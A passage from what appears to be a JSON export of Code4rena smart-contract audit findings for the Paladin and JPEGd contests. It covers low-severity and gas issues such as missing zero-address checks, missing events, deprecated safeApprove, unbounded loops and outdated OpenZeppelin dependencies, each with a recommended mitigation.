https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L52\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended at the minimum to add zero address checks for all listed setter functions. In addition adding checks for functions that are using user's supplied addresses could prevent some unexpected behavior of the contracts.\n\n# 4. Owner - critical address change\n\n## Risk\nLow\n\n## Impact\nChanging critical addresses such as ownership of `HolyPaladinTokens.sol` and `PaladinRewardReserver.sol` contracts should be a two-step process where the first transaction (from the old/current address) registers the new address (i.e. grants ownership) and the second transaction (from the new address) replaces the old address with the new one. This gives an opportunity to recover from incorrect addresses mistakenly used in the first step. If not, contract functionality might become inaccessible. \n\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L12\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L11\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended to implement two-step process for passing ownership for HolyPaladinToken.sol and PaladinRewardReserve.sol contracts.\n\n# 5. Missing events\n\n## Risk\nLow\n\n## Impact\nContract `HolyPaladinToken.sol` is missing events for `triggerEmergencyWithdraw` function. Lack of events makes it difficult for off-chain applications to monitor if contract is in emergency mode and if users should perform emergency withdraw.\n\nIn addition functions `setKickRatio` and `setEndDropPerSecond` are missing emitting events.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1425-L1427\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1416-L1419\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1433-L1436\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nAdd emitting events to:\n* triggerEmergencyWithdraw\n* setKickRatio\n* setEndDropPerSecond\n\n# 6. Cooldown can be used in emergency mode\n\n## Risk\nLow\n\n## Impact\nContract `HolyPaladinToken.sol` implements emergency mode that disables contract functionality and allows `emergencyWithdraw`. Function `cooldown` does not check if the contract is in emergency mode which allows changing contract state variable `cooldowns[]` even when emergency mode is enabled.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L228\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended to add the same check that can be found in all other functions `if(emergency) revert EmergencyBlock();`.\n\n# 7. Inconsistent use of msg.sender and _msgSender()\n\n## Risk\nLow\n\n## Impact\nContract `HolyPaladinToken.sol` uses `_msgSender()` in `delegate` function which is inconsistent with use of `msg.sender` in all the other functions. This can potentially create vulnerabilities if `_msgSender()` gets overridden later on and the two values are not identical anymore (e.g. if a network is paying for the transaction fees).\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L373\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nIt is recommended to use `msg.sender` in `delegate` function, or switch to the usage of `_msgSender()` in whole contract. \n\n# 8. safeApprove deprecated \n\n## Risk\nNon-Critical\n\n## Impact\nThe OpenZeppelin SafeERC20 safeApprove() function has been deprecated, as [seen in the comments of the OpenZeppelin code](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/828fe365eeff13e7aa188e449005ad81f7222189/contracts/token/ERC20/utils/SafeERC20.sol#L39-L44). Using this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in OZ issue [#2219](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219).\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L31\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L38-L39\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L47\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nAs suggested by the OpenZeppelin comment, replace safeApprove() with safeIncreaseAllowance().\n\n# 9. The contracts use unlocked pragma\n\n## Risk\nNon-Critical\n\n## Impact\nAs different compiler versions have critical behavior specifics if the contract gets accidentally deployed using another compiler version compared to one they tested with, various types of undesired behavior can be introduced.\n\n## Proof of Concept\nAll the contracts in scope use unlocked pragma:\n\nExamples:\n* (^0.8.10) https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol\n* (^0.8.4) https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nConsider locking compiler version, for example pragma solidity 0.8.10.\n\n# 10. Contracts use different compiler versions\n\n## Risk\nNon-Critical\n\n## Impact\nUsing different compiler versions across contracts of the same project might lead to confusion and accidental errors.\n\n## Proof of Concept\n\nExamples:\n* (^0.8.10) https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol\n* (^0.8.4) https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol\n\n## Tools Used\nVS Code\n\n## Recommended Mitigation Steps\nConsider using a single compiler version for compiling both contracts, for example 0.8.10\n\n# 11. Function _getPastDelegate is never used\n\n## Risk\nNon-Critical\n\n## Impact\nFunction `_getPastDelegate` is implemented but it is never used. Its existence just increase the amount of gas needed to be used for the deployment and makes contract code less readable.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L993\n\n## Tools Used\nSlither\n\n## Recommended Mitigation Steps\nIt is recommended to delete `_getPastDelegate` function.",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/66"
    }
  },
  {
    "title": "QA Report",
    "body": "* Usage of deprecated `safeApprove`. [Link](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#SafeERC20-safeApprove-contract-IERC20-address-uint256-)\n * There is no zero address/value check for the `immutable` variables (`_rewardsVault`, `_startDropPerSecond`,`_dropDecreaseDuration`,`_baseLockBonusRatio`, `_minLockBonusRatio`, `_maxLockBonusRatio` ) inside the `constructor` function at `HolyPaladinToken.sol`\n * Contract is not `pausable`. Instead of Emergency condition which downgrades users' positions, OpenZeppelin's `pausable.sol `can be utilized.",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/55"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L53\n\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n\n# C4-002 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following all contract functions.\n\n```\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L174\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L28\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L36\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L44\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n# C4-003 : transferOwnership should be two step process\n\n## Impact -  LOW\n\nThe current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of Concept\n\n1. Navigate to the following contract : https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L12, https://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L11.\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n# C4-004 :  Consider making contracts Pausable\n\n## Impact -  LOW\n\nThere are many external risks so my suggestion is that you should consider making the contracts pausable, so in case of an unexpected event, the admin can pause transfers.\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider making contracts Pausable https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol.\n\n# C4-005 : Critical changes should use two-step procedure\n\n## Impact - NON CRITICAL\n\nThe critical procedures should be two step process.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1433\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1416\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nLack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions.\n\n# C4-006 : Missing events for only functions that change critical parameters\n\n## Impact - Non critical\n\nThe functions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users’ perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1426\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L1416\n\n```\n\nSee similar High-severity H03 finding OpenZeppelin’s Audit of Audius (https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding OpenZeppelin’s Audit of UMA Phase 4 (https://blog.openzeppelin.com/uma-audit-phase-4/)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nAdd events to all functions that change critical parameters.\n\n# C4-007 : # safeApprove of openZeppelin is deprecated\n\n## Impact\n\nThe protocol use safeApprove of openZeppelin although it's deprecated.\n(see https://github.com/OpenZeppelin/openzeppelin-contracts/blob/566a774222707e424896c0c390a84dc3c13bdcb2/contracts/token/ERC20/utils/SafeERC20.sol#L38)\nThe protocol should change it to increase/decrease Allowance as OpenZeppilin says.\n\n## Proof Of Concept\n\nThis appears in the following locations in the code base:\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L47\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L39\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/PaladinRewardReserve.sol#L31\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nThe protocol should change it to increase/decrease Allowance as OpenZeppilin says.\n\n# C4-008 : # Missing Re-entrancy Guard\n\n## Impact\n\nThe re-entrancy guard is missing on the some of the functions. The external interactions can cause to the re-entrancy vulnerability.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-paladin/blob/main/contracts/HolyPaladinToken.sol#L327\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/52"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "1. Using operator `++` instead of ` + 1` for saving more gas\n\n##Impact \nexpensive gas\n\n##Tool Used\nRemix\n\n##Recommended Mitigation Step\n`low = mid++;`\n\n##Occurances\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L526\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L698\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L955\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L987\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1019\n\n\n2. Used `Memory` for saving gas\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1174\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1242\n\n##Impact\nExpensive Gas\n\n##Tool Used\nRemix\n\n##Recommendation Mitigation\nused `memory` instead of `storage`\n\n3. Saving gas by removing ` = 0`\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/HolyPaladinToken.sol#L1301-L1302\n\nIf a variable was not set/initialized, it is assumed to have default value to 0\nthis implementation was used for saving more gas by removing `= 0`\n\n##POC\nhttps://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6\n\n##TOOLS USED\nRemix, Manual Review\n\n##Mitigation Step\nRemove `= 0`\n\n4. Goodway to saving more gas in `SafeERC20`\n\nhttps://github.com/code-423n4/2022-03-paladin/blob/9c26ec8556298fb1dc3cf71f471aadad3a5c74a0/contracts/PaladinRewardReserve.sol#L53\n\nthis implementation can be used for another gas opt\n\n##Impact\nExpensive gas\n\n##POC\nhttps://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20\n\n##Tool Used\nManual Review\n\n##Reccomendation Mitigation Steps\nby do not declaring `using SafeERC20 for IERC20;` and used `safeTransfer`.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-paladin-findings",
      "repo": "https://github.com/code-423n4/2022-03-paladin-findings",
      "url": "https://github.com/code-423n4/2022-03-paladin-findings/issues/50"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### Missing events for parameter changes\n\nThroughout the codebase, most state changing functions that update protocol parameters do not emit events. \n\nFor example:\n\n- [`NFTVault#setCreditLimitRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L232)\n- [`NFTVault#setLiquidationLimitRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L247)\n- [`NFTVault#toggleFallbackOracle`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L262)\n- [`NFTVault#setBorrowAmountCap`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L203)\n- [`NFTVault#setDebtInterestApr`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L212)\n- [`NFTVault#setValueIncreaseLockRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L222)\n- [`NFTVault#setJPEGLockTime`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L271)\n- [`NFTVault#disableFloorOverride`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L284)\n- [`NFTVault#setOrganizationFeeRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L290)\n- [`NFTVault#setInsurancePurchaseRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L300)\n- [`NFTVault#setInsuranceLiquidationPenaltyRate`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L310)\n\nThis limits the ability for off-chain monitoring tools to observe and react to changes to protocol parameters. It's considered a best practice to emit events for state changing operations, especially changes to key protocol parameters.\n\n### Avoid payable.transfer\n\nETH transfers in `FungibleAssetVaultForDAO#withdraw` are performed using `payable(msg.sender).transfer`. \n\nIt's considered a best practice to avoid this pattern for ETH transfers, since it forwards a fixed amount of gas and may revert if future gas costs change. (See the Consensys Diligence article [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/).)\n\nSince the `withdraw` function is already `nonReentrant`, consider using OpenZeppelin's [`Address.sendValue`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60) instead.\n\n### Unbounded iteration over LP farming pools in `_massUpdatePools` \n\nThe `_massUpdatePools` function in `LPFarming.sol` iterates over all active and inactive LP pools. The contract owner may add, but not update or remove pools. \n\nIf the `poolInfo` array grows too large, `add`, `set`, and `newEpoch` may revert, impacting the ability to create and manage pools and preventing creation of new rewards epochs.\n\nAdditionally, the `_updatePool` function contains an external call to `pool.lpToken.balanceOf`. If a malicious or malfunctioning LP token is added to a configured pool, this call may revert. \n\nLikelihood is mitigated since adding pools is a permissioned function and there will likely be a limited number of LP pools. Owner should monitor gas usage when adding a new pool, and take care to validate approved LP token addresses. Consider adding the ability to disable, remove, or reconfigure a pool.\n\n#### Code\n\n[`LPFarming.sol#281`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L281)\n```solidity\n    function _massUpdatePools() internal {\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid < length; ++pid) {\n            _updatePool(pid);\n        }\n    }\n```\n\n[`LPFraming.sol#300`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L300)\n```solidity\n    function _updatePool(uint256 _pid) internal {\n        PoolInfo storage pool = poolInfo[_pid];\n        if (pool.allocPoint == 0) {\n            return;\n        }\n\n        uint256 blockNumber = _blockNumber();\n        //normalizing the pool's `lastRewardBlock` ensures that no rewards are distributed by staking outside of an epoch\n        uint256 lastRewardBlock = _normalizeBlockNumber(pool.lastRewardBlock);\n        if (blockNumber <= lastRewardBlock) {\n            return;\n        }\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) {\n            pool.lastRewardBlock = blockNumber;\n            return;\n        }\n        uint256 reward = ((blockNumber - lastRewardBlock) *\n            epoch.rewardPerBlock *\n            1e36 *\n            pool.allocPoint) / totalAllocPoint;\n        pool.accRewardPerShare = pool.accRewardPerShare + reward / lpSupply;\n        pool.lastRewardBlock = blockNumber;\n    }\n```\n\n### Unbounded iteration over LP farming pools in `claimAll()` \n\nThe `claimAll` function in `LPFarming.sol` iterates over all active and inactive LP pools in the `poolInfo` array to claim rewards. The contract owner may add, but not remove pools. \n\nIf the `poolInfo` array grows too large, `claimAll`, may revert, preventing users from claiming accrued rewards. Additionally, the `_updatePool` function contains an external call to `pool.lpToken.balanceOf` that could revert if a malicious or malfunctioning LP token is added to pool configuration.\n\nSeverity is significantly mitigated since the user may still claim rewards from a single pool using `claim(uint256)`. Likelihood is mitigated since adding pools is a permissioned function and there will likely be a limited number of LP pools. Owner should monitor gas usage when adding new pools.\n\n#### Code\n\n[`LPFarming.sol#348`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L348)\n```solidity\n    function claimAll() external nonReentrant noContract(msg.sender) {\n        for (uint256 i = 0; i < poolInfo.length; i++) {\n            _updatePool(i);\n            _withdrawReward(i);\n        }\n\n        uint256 rewards = userRewards[msg.sender];\n        require(rewards > 0, \"no_reward\");\n\n        jpeg.safeTransfer(msg.sender, rewards);\n        userRewards[msg.sender] = 0;\n\n        emit ClaimAll(msg.sender, rewards);\n    }\n```\n\n## QA/Informational\n\n### Duplicated `noContract` modifier\n\nThe `noContract` modifier, `whitelistedContracts` mapping, and `setContractWhitelisted` functions  are duplicated across multiple contracts. Consider extracting this functionality to a shared abstract contract.\n\nUsages:\n- [`yVaultLPFarming.sol#54`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L54)\n- [`LPFarming.sol#85`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L54)\n- [`yVault.sol#61`](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/vaults/yVault/yVault.sol#L61)\n\n### Constructor call without args can be omitted\n\nThe `Ownable()` and `ReentrancyGuard()` calls included inline in the `JPEGLock` constructor may be omitted since these base contracts require no constructor arguments.\n\n[`JPEGLock#31`](https://github.com/code-423n4/2022-04-jpegd/blob/59e288c27e1ff1b47505fea2e5434a7577d85576/contracts/lock/JPEGLock.sol#L31)\n```solidity\n    constructor(IERC20 _jpeg) Ownable() ReentrancyGuard() {\n        jpeg = _jpeg;\n        lockTime = 365 days;\n    }\n```\n\nSuggested:\n```solidity\n    constructor(IERC20 _jpeg) {\n        jpeg = _jpeg;\n        lockTime = 365 days;\n    }\n```\n\n### Local variable shadows initializer\n\nThe local variable `initializer` inside the category initialization loop in `NFTVault#constructor` shadows the `initializer` modifier. Consider renaming this local variable.\n\n[`NFTVault.sol#182`](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L182)\n\n```solidity\n        for (uint256 i = 0; i < _typeInitializers.length; i++) {\n            // QA: variable name shadows `initializer` modifier\n            NFTCategoryInitializer memory initializer = _typeInitializers[i];\n            nftTypeValueETH[initializer.hash] = initializer.valueETH;\n            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n                nftTypes[initializer.nfts[j]] = initializer.hash;\n            }\n        }\n```\n\n### Missing parameter documentation\n\nNatspec documentation is missing for the `_jpeg` parameter in [`Controller#constructor`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L25).\n\n### Omit boolean check\n\nSince `approvedStrategies[_token][_strategy]` returns a boolean value, you can safely omit the `== true` check on [line 87](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/Controller.sol#L87) of `Controller#setStrategy`.\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/232"
    }
  },
  {
    "title": "Update initializer modifier to prevent reentrancy during initialization",
    "severity": "major",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19\n\n\n# Vulnerability details\n\n## Impact\n\nThe solution uses:\n```jsx\n    \"@openzeppelin/contracts\": \"^4.0.0\",\n    \"@openzeppelin/contracts-upgradeable\": \"^4.3.2\",\n```\nThese dependencies have a known high severity vulnerability: \n- https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177\n- https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177\n- https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176\n\nWhich makes these contracts vulnerable:\n```jsx\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  71:     ) external initializer {\n\ncontracts/vaults/NFTVault.sol:\n  149:     ) external initializer {\n```\n\n## Recommended Mitigation Steps\nUpgrade `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to version 4.4.1 or higher.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-04-jpegd-findings",
      "repo": "https://github.com/code-423n4/2022-04-jpegd-findings",
      "url": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/227"
    }
  },
  {
    "title": "QA Report",
    "body": "## Codebase Impressions & Summary\n\nOverall, the code quality is high.\n\nThe findings here revolve around some commonly suggested practices.\n\n## [L-01] Add constructor initializers\n\nAs per [OpenZeppelin’s (OZ) recommendation](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680/6), “The guidelines are now to make it impossible for *anyone* to run `initialize` on an implementation contract, by adding an empty constructor with the `initializer` modifier. So the implementation contract gets initialized automatically upon deployment.”\n\nNote that this behaviour is also incorporated the [OZ Wizard](https://wizard.openzeppelin.com/) since the UUPS vulnerability discovery: “Additionally, we modified the code generated by the [Wizard 19](https://wizard.openzeppelin.com/) to include a constructor that automatically initializes the implementation when deployed.”\n\nFurthermore, this thwarts any attempts to frontrun the initialization tx of these contracts:\n\n```solidity\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  66:     function initialize(\n\ncontracts/vaults/NFTVault.sol:\n  139:     function initialize(\n```\n\n## [L-02] Immutable addresses should be 0-checked\n\nConsider adding an `address(0)` check here (see `@audit`):\n\n```solidity\ncontracts/farming/LPFarming.sol:\n  77:         jpeg = IERC20(_jpeg); //@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol\n\ncontracts/vaults/yVault/Controller.sol:\n  28:         jpeg = IERC20(_jpeg);  //@audit low: should be address(0) checked just like in yVaultLPFarming.sol and StrategyPUSDConvex.sol\n\ncontracts/vaults/yVault/yVault.sol:\n  53:         token = ERC20(_token);  //@audit low: should be address(0)\n```\n\n## [L-03] Unbounded loop on array can lead to DoS\n\nAs this array can grow quite large, the transaction's gas cost could exceed the block gas limit and make it impossible to call this function at all (see `@audit`):\n\n```solidity\nFile: LPFarming.sol\n141:     function add(uint256 _allocPoint, IERC20 _lpToken) external onlyOwner { \n...\n146:         poolInfo.push( //@audit low: a push exist but there's no pop in the solution.\n...\n154:     }\n...\n347:     function claimAll() external nonReentrant noContract(msg.sender) {\n348:         for (uint256 i = 0; i < poolInfo.length; i++) { //@audit low: poolInfo is unbounded\n349:             _updatePool(i);\n350:             _withdrawReward(i);\n351:         }\n...\n360:     }\n```\n\nConsider introducing a reasonable upper limit based on block gas limits and/or adding a `remove` method to remove elements in the array.\n\n## [L-04] Add a timelock and event to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate.\n\nConsider adding a timelock and event to:\n\n```\nvaults/yVault/strategies/StrategyPUSDConvex.sol:177:    function setPerformanceFee(Rate memory _performanceFee)\nvaults/NFTVault.sol:290:    function setOrganizationFeeRate(Rate memory _organizationFeeRate)\n```\n\n## 